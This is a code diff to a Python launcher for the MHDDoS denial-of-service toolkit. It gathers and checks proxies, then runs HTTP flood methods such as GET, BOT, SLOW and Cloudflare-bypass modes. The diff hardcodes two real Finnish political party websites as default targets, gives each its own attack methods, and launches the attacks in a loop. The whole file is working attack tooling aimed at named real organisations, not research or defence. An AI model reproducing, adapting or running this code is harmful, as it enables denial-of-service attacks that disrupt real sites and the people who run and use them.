@@ -12,9 +12,17 @@ from MHDDoS.start import ProxyManager
 from PyRoxy import ProxyChecker
 from PyRoxy import ProxyType
 
+targets = [
+]
+
+with open("targets.txt", "r") as f:
+    for line in f:
+        targets.append(line.strip())
+
+
 
 def update_proxies(period, proxy_timeout, threads, targets):
-    #  Avoid parsing proxies too often when restart happens
+    # Avoid parsing proxies too often when restart happens
     if os.path.exists('files/proxies/proxies.txt'):
         last_update = os.path.getmtime('files/proxies/proxies.txt')
         if (time.time() - last_update) < period / 2:
@@ -23,16 +31,16 @@ def update_proxies(period, proxy_timeout, threads, targets):
     with open('../proxies_config.json') as f:
         config = json.load(f)
 
-    Proxies = list(ProxyManager.DownloadFromConfig(config, 0))
-    random.shuffle(Proxies)
+    proxies = list(ProxyManager.DownloadFromConfig(config, 0))
+    random.shuffle(proxies)
 
-    CheckedProxies = []
+    checked_proxies = []
     size = len(targets)
-    print(f'{len(Proxies):,} Proxies are getting checked, this may take awhile:')
+    print(f'{len(proxies):,} Proxies are getting checked, this may take awhile:')
 
     futures = []
     with ThreadPoolExecutor(size) as executor:
-        for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
+        for target, chunk in zip(targets, (proxies[i::size] for i in range(size))):
             print(f'{len(chunk):,} Proxies are getting checked for {target}')
             futures.append(
                 executor.submit(
@@ -45,16 +53,16 @@ def update_proxies(period, proxy_timeout, threads, targets):
             )
 
         for future in as_completed(futures):
-            CheckedProxies.extend(future.result())
+            checked_proxies.extend(future.result())
 
-    if not CheckedProxies:
+    if not checked_proxies:
         exit("Proxy Check failed, Your network may be the problem | The target may not be available.")
 
     os.makedirs('files/proxies/', exist_ok=True)
     with open('files/proxies/proxies.txt', "w") as all_wr, \
          open('files/proxies/socks4.txt', "w") as socks4_wr, \
          open('files/proxies/socks5.txt', "w") as socks5_wr:
-        for proxy in CheckedProxies:
+        for proxy in checked_proxies:
             proxy_string = str(proxy) + "\n"
             all_wr.write(proxy_string)
             if proxy.type == ProxyType.SOCKS4:
@@ -113,12 +121,16 @@ def start(total_threads, period, targets, rpc, udp_threads, http_methods, proxy_
 
 
 def init_argparse() -> argparse.ArgumentParser:
+    """
+    Initialize argument parser.
+
+    Returns
+    -------
+    argparse.ArgumentParser
+        Configured argument parser.
+    """
     parser = argparse.ArgumentParser()
-    parser.add_argument(
-        'targets',
-        nargs='+',
-        help='List of targets, separated by spaces',
-    )
+
     parser.add_argument(
         '-t',
         '--threads',
@@ -163,20 +175,43 @@ def init_argparse() -> argparse.ArgumentParser:
         '--http-methods',
         nargs='+',
         default=['GET', 'STRESS', 'BOT', 'SLOW'],
-        help='List of HTTP(s) attack methods to use. Default is GET, STRESS, BOT, DOWNLOADER',
+        help='List of HTTP(s) attack methods to use. Default is GET, STRESS, BOT, SLOW',
     )
     return parser
 
 
-if __name__ == '__main__':
-    args = init_argparse().parse_args()
-    start(
-        args.threads,
-        args.period,
-        args.targets,
-        args.rpc,
-        args.udp_threads,
-        args.http_methods,
-        args.proxy_timeout,
-        args.debug,
-    )
+TARGET_METHODS = {
+    "https://www.perussuomalaiset.fi": ["GET", "BOT", "SLOW"],
+    "https://ps-nuoriso.fi": ["CFB", "CFBUAM"]
+}
+
+TARGETS = [
+    "https://www.perussuomalaiset.fi",
+    "https://ps-nuoriso.fi"
+]
+
+if targets and len(targets) > 0:
+    TARGETS = targets
+
+
+def get_methods_for_target(target: str) -> list:
+    """
+    Retrieve HTTP methods for a specific target.
+
+    Parameters
+    ----------
+    target : str
+        The target URL.
+
+    Returns
+    -------
+    list
+        List of HTTP methods for the target.
+    """
+    return TARGET_METHODS.get(target, ["GET", "STRESS", "BOT", "SLOW"])
+
+args = init_argparse().parse_args()
+
+for target in TARGETS:
+    methods = get_methods_for_target(target)
+    start(args.threads, args.period, [target], 50, 0, methods, args.proxy_timeout, args.debug)
